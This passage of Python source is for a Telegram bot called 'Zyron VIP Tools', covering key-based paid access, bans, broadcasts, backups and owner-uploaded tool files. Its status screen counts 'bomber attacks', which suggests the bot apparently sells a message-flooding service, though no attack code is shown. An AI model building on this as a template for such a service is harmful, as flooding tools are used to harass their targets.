        elif data.startswith("quick_approve_"):
            parts = data.split("_")
            target_id = int(parts[2])
            days = int(parts[3]) if len(parts) > 3 else 30
            # Extend from current expiry if still active
            now_ts = datetime.datetime.now().timestamp()
            current_exp = USER_ACCESS.get(target_id)
            base = max(current_exp, now_ts) if (current_exp and current_exp > now_ts) else now_ts
            expire_ts = base + (days * 86400)
            USER_ACCESS[target_id] = expire_ts
            if target_id not in USER_ROLES:
                USER_ROLES[target_id] = "user"
            schedule_save()
            expire_str = datetime.datetime.fromtimestamp(expire_ts).strftime("%b %d, %Y")
            await safe_answer_callback(query, f"✅ +{days}d for {target_id} · expires {expire_str}", show_alert=True)
            # If we came from userlist, refresh it; otherwise refresh the lookup card
            if context.user_data.get("action_source") == "userlist":
                back_page = context.user_data.get("userlist_page", 0)
                await user_list(update, context, page=back_page)
            else:
                await _refresh_lookup_card(query, context, target_id)
        else:
            await safe_edit(query.message, 
                "⚠️ *Unknown button action!*\n\nPlease try again or use /start.",
                parse_mode="Markdown"
            )
    except Exception as e:
        logging.error(f"Callback handler error [data={data}]: {e}", exc_info=True)
        err_msg = "⚠️ *ᴀɴ ᴜɴᴇxᴘᴇᴄᴛᴇᴅ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ.*\n\nPlease try again or use /start to reset."
        try:
            await safe_edit(query.message, err_msg, parse_mode="Markdown")
        except Exception:
            try:
                await query.message.reply_text(err_msg, parse_mode="Markdown")
            except Exception:
                pass





# ========== ADMIN BACKUP ==========
async def admin_backup(update: Update, context: CallbackContext):
    """Send access.json and keys.json as backup files to the owner"""
    user_id = update.effective_user.id
    query = update.callback_query
    if not is_at_least_role(user_id, "owner"):
        await safe_answer_callback(query, "❌ Access Denied!", show_alert=True)
        return
    await safe_answer_callback(query, "📦 Preparing backup...", show_alert=False)

    files_sent = 0
    backup_caption = (
        f"💾 *ʙᴀᴄᴋᴜᴘ — ᴢʏʀᴏɴ ᴠɪᴘ ᴛᴏᴏʟs*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🕐 {datetime.datetime.now().strftime('%b %d, %Y %I:%M %p')}\n"
        f"👥 ᴜsᴇʀs: {len(USER_ACCESS)} | 🔑 ᴋᴇʏs: {len(ACCESS_KEYS)}"
    )

    for filepath in [ACCESS_FILE, KEYS_FILE]:
        if os.path.exists(filepath):
            with open(filepath, "rb") as f:
                await query.message.reply_document(
                    document=f,
                    filename=os.path.basename(filepath),
                    caption=backup_caption if files_sent == 0 else None,
                    parse_mode="Markdown"
                )
            files_sent += 1

    if files_sent == 0:
        await query.message.reply_text("⚠️ ɴᴏ ʙᴀᴄᴋᴜᴘ ғɪʟᴇs ғᴏᴜɴᴅ.", parse_mode="Markdown")
    else:
        logging.info(f"Owner {user_id} downloaded backup ({files_sent} files)")

# ========== ADMIN RELOAD DATABASES ==========
async def admin_reload(update: Update, context: CallbackContext):
    """Reload access.json and keys.json from disk without restarting"""
    user_id = update.effective_user.id
    query = update.callback_query
    if not is_at_least_role(user_id, "owner"):
        await safe_answer_callback(query, "❌ Access Denied!", show_alert=True)
        return
    await safe_answer_callback(query, "🔄 Reloading...", show_alert=False)

    before_users = len(USER_ACCESS)
    before_keys = len(ACCESS_KEYS)
    load_existing_data()
    after_users = len(USER_ACCESS)
    after_keys = len(ACCESS_KEYS)

    await query.message.reply_text(
        f"✅ *ᴅᴀᴛᴀʙᴀsᴇs ʀᴇʟᴏᴀᴅᴇᴅ*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👥 ᴜsᴇʀs: {before_users} → *{after_users}*\n"
        f"🔑 ᴋᴇʏs: {before_keys} → *{after_keys}*\n"
        f"🕐 {datetime.datetime.now().strftime('%I:%M %p')}",
        parse_mode="Markdown"
    )
    logging.info(f"Owner {user_id} reloaded databases.")

# ========== ADD TOOL COMMAND (Owner only) ==========

async def addtool_command(update: Update, context: CallbackContext):
    """Owner uploads a file directly to the tools folder via the bot"""
    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        await update.effective_message.reply_text("❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        return
    AWAITING_TOOL_UPLOAD.add(user_id)
    await update.effective_message.reply_text(
        "📥 *ᴀᴅᴅ ᴛᴏᴏʟ*\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "sᴇɴᴅ ᴀɴʏ ғɪʟᴇ ɴᴏᴡ ᴀɴᴅ ɪᴛ ᴡɪʟʟ ʙᴇ ᴀᴅᴅᴇᴅ ᴛᴏ ᴛʜᴇ ᴛᴏᴏʟs ʟɪsᴛ.\n\n"
        "ᴛᴀᴘ ⬅️ ᴄᴀɴᴄᴇʟ ᴛᴏ ᴀʙᴏʀᴛ.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]),
        parse_mode="Markdown"
    )

async def handle_tool_upload(update: Update, context: CallbackContext):
    """Handle file upload for /addtool"""
    user_id = update.effective_user.id
    if user_id not in AWAITING_TOOL_UPLOAD:
        return
    if not update.message.document:
        await update.effective_message.reply_text("⚠️ ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ ғɪʟᴇ (ᴅᴏᴄᴜᴍᴇɴᴛ).", parse_mode="Markdown")
        return
    doc = update.message.document
    filename = doc.file_name or f"tool_{int(time.time())}"
    if not os.path.exists(TOOLS_FOLDER):
        os.makedirs(TOOLS_FOLDER)
    filepath = os.path.join(TOOLS_FOLDER, filename)
    file = await doc.get_file()
    await file.download_to_drive(filepath)
    size_kb = os.path.getsize(filepath) / 1024
    size_str = f"{size_kb:.1f} KB" if size_kb < 1024 else f"{size_kb/1024:.1f} MB"
    AWAITING_TOOL_UPLOAD.discard(user_id)
    await update.effective_message.reply_text(
        f"✅ *ᴛᴏᴏʟ ᴀᴅᴅᴇᴅ!*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 `{filename}`\n"
        f"📦 {size_str}\n"
        f"📥 ᴀᴠᴀɪʟᴀʙʟᴇ ɪɴ /start → ᴛᴏᴏʟs",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📥 ᴠɪᴇᴡ ᴛᴏᴏʟs", callback_data="show_tools")]]),
        parse_mode="Markdown"
    )
    logging.info(f"Owner {user_id} uploaded tool: {filename} ({size_str})")

async def removetool_command(update: Update, context: CallbackContext):
    """Owner removes a tool: /removetool filename"""
    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        await update.effective_message.reply_text("❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        return
    if not context.args:
        files = sorted([f for f in os.listdir(TOOLS_FOLDER) if os.path.isfile(os.path.join(TOOLS_FOLDER, f))]) if os.path.exists(TOOLS_FOLDER) else []
        if not files:
            await update.effective_message.reply_text("📭 ɴᴏ ᴛᴏᴏʟs ᴛᴏ ʀᴇᴍᴏᴠᴇ.", parse_mode="Markdown")
            return
        list_text = "\n".join([f"• `{f}`" for f in files])
        await update.effective_message.reply_text(
            f"🗑️ *ʀᴇᴍᴏᴠᴇ ᴛᴏᴏʟ*\nᴜsᴀɢᴇ: `/removetool filename`\n\n*ᴀᴠᴀɪʟᴀʙʟᴇ ᴛᴏᴏʟs:*\n{list_text}",
            parse_mode="Markdown"
        )
        return
    filename = " ".join(context.args)
    filepath = os.path.join(TOOLS_FOLDER, filename)
    if os.path.exists(filepath):
        os.remove(filepath)
        await update.effective_message.reply_text(f"✅ `{filename}` ʀᴇᴍᴏᴠᴇᴅ ғʀᴏᴍ ᴛᴏᴏʟs.", parse_mode="Markdown")
        logging.info(f"Owner {user_id} removed tool: {filename}")
    else:
        await update.effective_message.reply_text(f"❌ `{filename}` ɴᴏᴛ ғᴏᴜɴᴅ ɪɴ ᴛᴏᴏʟs.", parse_mode="Markdown")

# ========== MY KEY COMMAND ==========
async def mykey_command(update: Update, context: CallbackContext):
    """Let users check their own access status and expiry.
    Works from both /mykey command and the show_mykey callback button."""
    if await check_cooldown(update): return

    query    = update.callback_query
    user_id  = update.effective_user.id
    user     = update.effective_user
    access_info = USER_ACCESS.get(user_id)
    role     = USER_ROLES.get(user_id, "user").capitalize()

    if user_id == ADMIN_ID or (access_info is None and user_id in USER_ACCESS):
        status    = "♾️ *ʟɪғᴇᴛɪᴍᴇ / ᴘᴇʀᴍᴀɴᴇɴᴛ*"
        remaining = "ɴᴇᴠᴇʀ ᴇxᴘɪʀᴇs"
        bar       = "🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩"
    elif access_info and access_info > datetime.datetime.now().timestamp():
        remaining_secs = access_info - datetime.datetime.now().timestamp()
        days       = int(remaining_secs // 86400)
        hours      = int((remaining_secs % 86400) // 3600)
        expire_date = datetime.datetime.fromtimestamp(access_info).strftime("%b %d, %Y %I:%M %p")
        status     = "✅ *ᴀᴄᴛɪᴠᴇ*"
        remaining  = f"`{days}d {hours}h` (ᴇxᴘɪʀᴇs {expire_date})"
        total_days = USER_STATS.get(user_id, {}).get("key_total_days", 30)
        pct        = min(100, max(0, int(days / max(total_days, 1) * 100)))
        filled     = round(pct / 100 * 16)
        bar_str    = "█" * filled + "░" * (16 - filled)
        bar        = f"{bar_str}  {pct}% remaining ({days}d {hours}h left)"
    else:
        status    = "❌ *ᴇxᴘɪʀᴇᴅ / ɴᴏ ᴀᴄᴄᴇss*"
        remaining = "ɴᴏ ᴀᴄᴛɪᴠᴇ sᴜʙsᴄʀɪᴘᴛɪᴏɴ"
        bar       = "⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜"

    text = (
        f"🔑  *MY ACCESS STATUS*\n"
        f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
        f"👤  *{escape_md(user.first_name)}*  ›  `{user_id}`\n"
        f"🏷️  Role  ›  `{role}`\n"
        f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
        f"Status  ›  {status}\n"
        f"⏱️  {remaining}\n"
        f"`{bar}`\n"
        f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
        f"Key format  ›  `ZYRON-XXXX-XXXX-XXXX`\n"
        "Renew  ›  @ZyronDevv "
    )
    keyboard     = [[InlineKeyboardButton("🏠 ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if query:
        # Triggered by button — edit the existing message in-place
        await query.answer()
        await safe_edit(query.message, text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        # Triggered by /mykey command — reply normally
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")



async def adminhelp_command(update: Update, context: CallbackContext):
    """/adminhelp — full list of admin commands"""
    if not is_at_least_role(update.effective_user.id, "owner"):
        return
    await update.effective_message.reply_text(
        "👑 *Admin Command Reference*\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "👤 *User Management*\n"
        "`/approve <id> <Nd|Nh|lifetime>` — grant access\n"
        "`/lookup <id>` — full user profile\n"
        "`/activeusers` — list active users\n"
        "`/expiring` — users expiring in 48h\n"
        "`/resetstats <id>` — reset daily limits\n"
        "`/setquota <id> <n>` — set daily quota\n"
        "\n⚠️ *Warnings*\n"
        "`/warn <id> [reason]` — warn user (auto-ban at 3)\n"
        "`/warnings <id>` — view user warnings\n"
        "`/clearwarn <id>` — clear user warnings\n"
        "\n📝 *Notes*\n"
        "`/setnote <id> <text>` — attach note to user\n"
        "`/note <id>` — view user notes\n"
        "`/delnote <id>` — delete user notes\n"
        "`/notes` — list all users with notes\n"
        "\n🚫 *Bans*\n"
        "`/ban <id> [reason]` — ban user\n"
        "`/unban <id>` — unban user\n"
        "`/bans` — list banned users\n"
        "\n🔑 *Keys*\n"
        "`/genkey <dur> [count]` — quick generate\n"
        "`/delkey <KEY>` — delete a key\n"
        "`/keys` — list active keys\n"
        "`/clearlocks` — clear brute-force lockouts\n"
        "\n📊 *Stats & Info*\n"
        "`/globalstats` — bot-wide counters\n"
        "`/uptime` — health & memory\n"
        "`/feedbacks` — last 20 feedbacks\n"
        "\n⚙️ *Bot Control*\n"
        "`/broadcast <msg>` — send to all users\n"
        "`/addtool` — upload a tool file\n"
        "`/removetool <name>` — remove a tool\n"
        "`/backup` — download data backup\n"
        "`/adminhelp` — this message\n"
        "━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown"
    )

async def keys_command(update: Update, context: CallbackContext):
    """/keys — list all active unused access keys"""
    if not is_at_least_role(update.effective_user.id, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown")
        return
    if not ACCESS_KEYS:
        await update.effective_message.reply_text("🔑 No active keys.", parse_mode="Markdown")
        return
    lines = [f"🔑 *Active Keys* ({len(ACCESS_KEYS)} total)\n━━━━━━━━━━━━━━━━━━━━"]
    for key, meta in list(ACCESS_KEYS.items())[:30]:
        days = meta.get("days", "?")
        created = str(meta.get("created", ""))[:10]
        lines.append(f"`{key}` — {days}d _(created {created})_")
    if len(ACCESS_KEYS) > 30:
        lines.append(f"_...and {len(ACCESS_KEYS)-30} more_")
    await update.effective_message.reply_text("\n".join(lines), parse_mode="Markdown")

# ========== BAN COMMANDS ==========
async def ban_command(update: Update, context: CallbackContext):
    """Ban a user: /ban <user_id> [reason]"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "ban"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown")
        return
    if not context.args:
        await update.effective_message.reply_text("Usage: `/ban <user_id> [reason]`", parse_mode="Markdown")
        return
    try:
        target = int(context.args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid user ID.", parse_mode="Markdown")
        return
    reason = " ".join(context.args[1:]) or "No reason given"
    BANNED_USERS.add(target)
    schedule_save()
    try:
        await context.bot.send_message(target, f"🚫 You have been banned from this bot.\nReason: {escape_md(reason)}")
    except Exception:
        pass
    await update.effective_message.reply_text(
        f"✅ User `{target}` banned.\nReason: {escape_md(reason)}", parse_mode="Markdown"
    )
    logging.info(f"[ban] {caller} banned {target}: {reason}")
    asyncio.get_running_loop().create_task(log_to_channel(context.bot, f"🚫 BAN `{target}` — {reason} by `{caller}`"))

async def unban_command(update: Update, context: CallbackContext):
    """Unban a user: /unban <user_id>"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "unban"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown")
        return
    if not context.args:
        await update.effective_message.reply_text("Usage: `/unban <user_id>`", parse_mode="Markdown")
        return
    try:
        target = int(context.args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid user ID.", parse_mode="Markdown")
        return
    BANNED_USERS.discard(target)
    schedule_save()
    try:
        await context.bot.send_message(target, "✅ Your ban has been lifted. You can use the bot again.")
    except Exception:
        pass
    await update.effective_message.reply_text(f"✅ User `{target}` unbanned.", parse_mode="Markdown")
    asyncio.get_running_loop().create_task(log_to_channel(context.bot, f"✅ UNBAN `{target}` by `{caller}`"))

async def bans_command(update: Update, context: CallbackContext):
    """List all banned users: /bans"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner") and not has_perm(caller, "ban"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown")
        return
    if not BANNED_USERS:
        await update.effective_message.reply_text("✅ No users are currently banned.", parse_mode="Markdown")
        return
    lines = [f"🚫 Banned Users ({len(BANNED_USERS)} total)\n━━━━━━━━━━━━━━━━━━━━"]
    for uid in sorted(BANNED_USERS):
        uname = USER_STATS.get(uid, {}).get("username", "")
        label = f"@{uname}" if uname else str(uid)
        lines.append(f"• `{uid}` — {label}")
    lines.append("\n/unban <id> to remove")
    await update.effective_message.reply_text("\n".join(lines), parse_mode="Markdown")

# ========== BROADCAST COMMAND ==========
async def broadcast_command(update: Update, context: CallbackContext):
    """Shortcut broadcast command: /broadcast <message>"""
    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner") and not has_perm(user_id, "broadcast"):
        await update.effective_message.reply_text("❌ No permission.", parse_mode="Markdown")
        return
    msg = " ".join(context.args)
    if not msg:
        await update.effective_message.reply_text("ᴜsᴀɢᴇ: `/broadcast ʏᴏᴜʀ ᴍᴇssᴀɢᴇ ʜᴇʀᴇ`", parse_mode="Markdown")
        return
    sent, failed = 0, 0
    import telegram.error as tg_error
    blocked = []
    for uid in list(USER_ACCESS.keys()):
        while True:
            try:
                await context.bot.send_message(
                    chat_id=int(uid),
                    text=f"📢 *ᴢʏʀᴏɴ ᴠɪᴘ ᴛᴏᴏʟs*\n━━━━━━━━━━━━━━━━━━━━\n\n{escape_md(msg)}\n\n━━━━━━━━━━━━━━━━━━━━\n📞 @ZyronDevv ",
                    parse_mode="Markdown"
                )
                sent += 1
                await asyncio.sleep(0.05)
                break
            except tg_error.RetryAfter as e:
                await asyncio.sleep(e.retry_after + 1)
            except tg_error.Forbidden:
                # User blocked the bot — remove from future broadcasts
                blocked.append(int(uid))
                failed += 1
                break
            except Exception:
                failed += 1
                break
    if blocked:
        logging.info(f"[broadcast] {len(blocked)} users have blocked the bot — cleaning up")
        for uid in blocked:
            USER_ACCESS.pop(uid, None)
        save_access()
    await update.effective_message.reply_text(
        f"📣 *ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇ*\n━━━━━━━━━━━━━━━━━━━━\n✅ sᴇɴᴛ: *{sent}* | ❌ ғᴀɪʟᴇᴅ: *{failed}*",
        parse_mode="Markdown"
    )

# ========== PING COMMAND ==========
async def id_command(update: Update, context: CallbackContext):
    """/id — show your Telegram user ID and info"""
    user = update.effective_user
    role = USER_ROLES.get(user.id, "user")
    has_acc = has_access(user.id)
    exp = USER_ACCESS.get(user.id)
    if exp is None and user.id in USER_ACCESS:
        exp_str = "♾️ Lifetime"
    elif exp:
        exp_str = datetime.datetime.fromtimestamp(exp).strftime("%b %d, %Y %H:%M")
    else:
        exp_str = "No access"
    await update.effective_message.reply_text(
        f"🪪 *Your Info*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 ID:       `{user.id}`\n"
        f"👤 Name:     `{escape_md(user.first_name)}`\n"
        f"💬 Username: `{'@' + user.username if user.username else 'none'}`\n"
        f"🏷️ Role:     `{role}`\n"
        f"🔐 Access:   `{'✅ Active' if has_acc else '❌ None'}`\n"
        f"📅 Expires:  `{exp_str}`\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown"
    )

async def ping_command(update: Update, context: CallbackContext):
    if await check_cooldown(update): return
    start_ping = time.time()
    msg = await update.effective_message.reply_text("🏓 ᴘɪɴɢɪɴɢ...")
    latency = (time.time() - start_ping) * 1000
    await safe_edit(msg, 
        f"🏓 *ᴘᴏɴɢ!*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ ʟᴀᴛᴇɴᴄʏ: `{latency:.0f}ms`\n"
        f"⏱️ ᴜᴘᴛɪᴍᴇ: `{get_uptime()}`\n"
        f"🤖 sᴛᴀᴛᴜs: 🟢 ᴏɴʟɪɴᴇ",
        parse_mode="Markdown"
    )

# ========== STATUS COMMAND ==========
async def uptime_command(update: Update, context: CallbackContext):
    """/uptime — show bot uptime and memory usage"""
    import sys
    uptime = get_uptime()
    mem_mb = 0
    try:
        import resource
        mem_mb = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss / 1024
    except Exception:
        pass
    await update.effective_message.reply_text(
        f"🤖 *Bot Health*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱️ Uptime:   `{uptime}`\n"
        f"🧠 Memory:   `{mem_mb:.1f} MB`\n"
        f"👥 Users:    `{len(USER_ACCESS)}`\n"
        f"🔑 Keys:     `{len(ACCESS_KEYS)}`\n"
        f"🚫 Banned:   `{len(BANNED_USERS)}`\n"
        f"🔧 Version:  `v{BOT_VERSION}`\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown"
    )

async def status_command(update: Update, context: CallbackContext):
    if await check_cooldown(update): return
    """Show bot status - available to everyone"""
    now = datetime.datetime.now().strftime("%b %d, %Y • %I:%M %p")
    total_users = len(USER_ACCESS)
    active_count = sum(1 for uid, exp in USER_ACCESS.items() if exp is None or exp > time.time())
    active_keys = len(ACCESS_KEYS)
    tools_count = len([f for f in os.listdir(TOOLS_FOLDER) if os.path.isfile(os.path.join(TOOLS_FOLDER, f))]) if os.path.exists(TOOLS_FOLDER) else 0
    maintenance_status = "🔴 ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ" if MAINTENANCE_MODE else "🟢 ᴏɴʟɪɴᴇ"

    status_text = (
        f"🤖  *BOT STATUS*  ›  `v{BOT_VERSION}`\n"
        f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
        f"⚡  {maintenance_status}\n"
        f"🕐  `{now}`  ·  ⏱️  `{get_uptime()}`\n"
        f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
        f"👥  Users   ›  `{total_users}` total  /  `{active_count}` active\n"
        f"🔑  Keys    ›  `{active_keys}`\n"
        f"📥  Tools   ›  `{tools_count}`\n"
        f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
        f"📊  *Lifetime Stats*\n"
        f"🔑  Generated  ›  `{GLOBAL_STATS['total_keys_generated']}`\n"
        f"✅  Redeemed   ›  `{GLOBAL_STATS['total_keys_redeemed']}`\n"
        f"📂  Files      ›  `{GLOBAL_STATS['total_files_generated']}`\n"
        f"💣  Bombs      ›  `{GLOBAL_STATS['total_bomber_attacks']}`\n"
        f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
        f"Support  ›  @ZyronDevv "
    )
    keyboard = [[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]]
    await update.effective_message.reply_text(status_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


# ========== BOT COMMAND MENU SETUP ==========
async def set_bot_commands(app):
    """Register commands so they appear in the Telegram / menu"""

    # Commands visible to everyone
    public_commands = [
        BotCommand("start",    "🏠 ᴍᴀɪɴ ᴍᴇɴᴜ"),
        BotCommand("mykey",    "🔑 ᴍʏ ᴀᴄᴄᴇss sᴛᴀᴛᴜs & ᴇxᴘɪʀʏ"),
        BotCommand("stats",    "📊 ᴍʏ ᴜsᴀɢᴇ sᴛᴀᴛɪsᴛɪᴄs"),
        BotCommand("status",   "🟢 ʙᴏᴛ sᴛᴀᴛᴜs & ᴜᴘᴛɪᴍᴇ"),
        BotCommand("ping",     "🏓 ᴄʜᴇᴄᴋ ʟᴀᴛᴇɴᴄʏ"),
        BotCommand("help",     "ℹ️ ʜᴇʟᴘ & ɢᴜɪᴅᴇ"),
        BotCommand("redeem",   "🔑 ʀᴇᴅᴇᴇᴍ ᴀᴄᴄᴇss ᴋᴇʏ"),
        BotCommand("cancel",   "❌ ᴄᴀɴᴄᴇʟ ᴄᴜʀʀᴇɴᴛ ᴀᴄᴛɪᴏɴ"),
        BotCommand("profile",  "🪪 ᴠɪᴇᴡ ʏᴏᴜʀ ғᴜʟʟ ᴘʀᴏғɪʟᴇ ᴄᴀʀᴅ"),
        BotCommand("checkin",  "🔥 ᴅᴀɪʟʏ ᴄʜᴇᴄᴋ-ɪɴ & sᴛʀᴇᴀᴋ"),
        BotCommand("refer",    "🔗 ɢᴇᴛ ʏᴏᴜʀ ʀᴇғᴇʀʀᴀʟ ʟɪɴᴋ"),
        BotCommand("report",   "🆘 ʀᴇᴘᴏʀᴛ ᴀɴ ɪssᴜᴇ ᴛᴏ ᴀᴅᴍɪɴ"),
        BotCommand("redeem",   "🔑 ʀᴇᴅᴇᴇᴍ ᴋᴇʏ ᴅɪʀᴇᴄᴛʟʏ"),
    ]

    # Extra commands visible to VIP users
    vip_commands = public_commands + [
        BotCommand("vipmenu",  "💎 ᴠɪᴘ ᴄᴏɴᴛʀᴏʟ ᴘᴀɴᴇʟ"),
        BotCommand("vipstats", "📊 ᴠɪᴘ ᴀɴᴀʟʏᴛɪᴄs"),
        BotCommand("vipperks", "🎁 ᴠɪᴘ ᴘᴇʀᴋs & ʟɪᴍɪᴛs"),
        BotCommand("viphelp",  "📋 ᴠɪᴘ ᴄᴏᴍᴍᴀɴᴅs"),
        BotCommand("bulkgen",  "📋 ʙᴜʟᴋ ɢᴇɴᴇʀᴀᴛᴇ ᴀʟʟ ᴅʙs"),
        BotCommand("checkup",  "🔍 ᴀᴄᴄᴏᴜɴᴛ ʜᴇᴀʟᴛʜ ᴄʜᴇᴄᴋ"),
    ]

    # Extra commands only the owner sees
    owner_commands = public_commands + [
        BotCommand("approve",     "✅ ɢʀᴀɴᴛ ᴜsᴇʀ ᴀᴄᴄᴇss ᴅɪʀᴇᴄᴛʟʏ"),
        BotCommand("genkey",      "🔑 ǫᴜɪᴄᴋ ɢᴇɴᴇʀᴀᴛᴇ ᴀᴄᴄᴇss ᴋᴇʏ"),
        BotCommand("delkey",      "🗑️ ᴅᴇʟᴇᴛᴇ ᴀ ᴋᴇʏ"),
        BotCommand("warn",        "⚠️ ᴡᴀʀɴ ᴀ ᴜsᴇʀ"),
        BotCommand("warnings",    "📋 ᴠɪᴇᴡ ᴜsᴇʀ ᴡᴀʀɴɪɴɢs"),
        BotCommand("clearwarn",   "🧹 ᴄʟᴇᴀʀ ᴜsᴇʀ ᴡᴀʀɴɪɴɢs"),
        BotCommand("setnote",     "📝 ᴀᴅᴅ ɴᴏᴛᴇ ᴛᴏ ᴜsᴇʀ"),
        BotCommand("notes",       "📋 ʟɪsᴛ ᴀʟʟ ɴᴏᴛᴇs"),
        BotCommand("delnote",     "🗑️ ᴅᴇʟᴇᴛᴇ ᴜsᴇʀ ɴᴏᴛᴇs"),
        BotCommand("lookup",      "🔍 ғᴜʟʟ ᴜsᴇʀ ᴘʀᴏғɪʟᴇ ʙʏ ɪᴅ"),
        BotCommand("userinfo",    "📊 ǫᴜɪᴄᴋ ᴜsᴇʀ sᴜᴍᴍᴀʀʏ ᴄᴀʀᴅ"),
        BotCommand("ban",         "🚫 ʙᴀɴ ᴀ ᴜsᴇʀ"),
        BotCommand("unban",       "✅ ᴜɴʙᴀɴ ᴀ ᴜsᴇʀ"),
        BotCommand("bans",        "📋 ʟɪsᴛ ʙᴀɴɴᴇᴅ ᴜsᴇʀs"),
        BotCommand("activeusers", "✅ ʟɪsᴛ ᴀᴄᴛɪᴠᴇ ᴜsᴇʀs"),
        BotCommand("expiring",    "⏳ ᴇxᴘɪʀɪɴɢ ᴡɪᴛʜɪɴ 48ʜ"),
        BotCommand("globalstats", "📊 ɢʟᴏʙᴀʟ ʙᴏᴛ sᴛᴀᴛs"),
        BotCommand("clearlocks",  "🔓 ᴄʟᴇᴀʀ ʙʀᴜᴛᴇ-ғᴏʀᴄᴇ ʟᴏᴄᴋs"),
        BotCommand("resetstats",  "🔄 ʀᴇsᴇᴛ ᴜsᴇʀ ᴅᴀɪʟʏ sᴛᴀᴛs"),
        BotCommand("setquota",    "📦 sᴇᴛ ᴜsᴇʀ ɢᴇɴ ǫᴜᴏᴛᴀ"),
        BotCommand("backup",      "💾 ᴅᴏᴡɴʟᴏᴀᴅ ᴅᴀᴛᴀ ʙᴀᴄᴋᴜᴘ"),
        BotCommand("broadcast",   "📣 sᴇɴᴅ ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ"),
        BotCommand("addtool",     "📥 ᴜᴘʟᴏᴀᴅ ᴀ ᴛᴏᴏʟ"),
        BotCommand("removetool",  "🗑️ ʀᴇᴍᴏᴠᴇ ᴀ ᴛᴏᴏʟ"),
        BotCommand("feedbacks",   "💬 ᴠɪᴇᴡ ᴜsᴇʀ ғᴇᴇᴅʙᴀᴄᴋs"),
        BotCommand("miniadmin",   "👑 ᴠɪᴇᴡ/ᴍᴀɴᴀɢᴇ ᴍɪɴɪ-ᴀᴅᴍɪɴs"),
        BotCommand("setperm",     "➕ ɢʀᴀɴᴛ ᴍɪɴɪ-ᴀᴅᴍɪɴ ᴘᴇʀᴍ"),
        BotCommand("rmperm",      "🗑️ ʀᴇᴠᴏᴋᴇ ᴍɪɴɪ-ᴀᴅᴍɪɴ ᴘᴇʀᴍ"),
        BotCommand("listadmins",  "📋 ʟɪsᴛ ᴀʟʟ ᴀᴅᴍɪɴs & ʀᴏʟᴇs"),
        BotCommand("helpadmin",   "📖 ᴀᴅᴍɪɴ ᴄᴏᴍᴍᴀɴᴅ ɢᴜɪᴅᴇ"),
    ]

    try:
        # Set public commands for all private chats
        await app.bot.set_my_commands(
            public_commands,
            scope=BotCommandScopeAllPrivateChats()
        )
        # Override with owner-specific commands for the owner's chat
        await app.bot.set_my_commands(
            owner_commands,
            scope=BotCommandScopeChat(chat_id=ADMIN_ID)
        )
        logging.info(f"✅ Commands registered")
    except Exception as e:
        logging.warning(f"Could not set bot commands: {e}")

async def usercount_command(update: Update, context: CallbackContext):
    """/usercount — fast user summary for owner"""
    if not is_at_least_role(update.effective_user.id, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown"); return
    now = time.time()
    total     = len(USER_ACCESS)
    active    = sum(1 for exp in USER_ACCESS.values() if exp is None or exp > now)
    expired   = total - active
    lifetime  = sum(1 for exp in USER_ACCESS.values() if exp is None)
    banned    = len(BANNED_USERS)
    resellers = sum(1 for r in USER_ROLES.values() if r == "reseller")
    vips      = sum(1 for r in USER_ROLES.values() if r == "vip")
    await update.effective_message.reply_text(
